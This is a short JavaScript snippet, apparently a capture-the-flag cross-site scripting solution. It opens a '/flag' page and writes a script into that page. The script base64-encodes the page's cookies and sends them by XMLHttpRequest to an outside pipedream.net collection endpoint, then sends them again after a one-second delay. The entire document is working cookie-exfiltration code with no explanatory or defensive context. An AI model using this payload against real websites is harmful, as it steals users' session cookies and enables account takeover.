console.log("started at "+ window.location.href)
window.alert = function() {console.log("alert(1337)")};
flag = window.open("/flag")
flag.window.document.write('Starting hack')
flag.window.document.write('<script>var xhttp = new XMLHttpRequest();xhttp.open("Get","https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(window.document.cookie));xhttp.send()</script>')
setTimeout(function(){flag.window.document.write('<script>var xhttp = new XMLHttpRequest();xhttp.open("Get","https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(window.document.cookie));xhttp.send()</script>')},1000)
console.log("ending at "+ window.location.href)
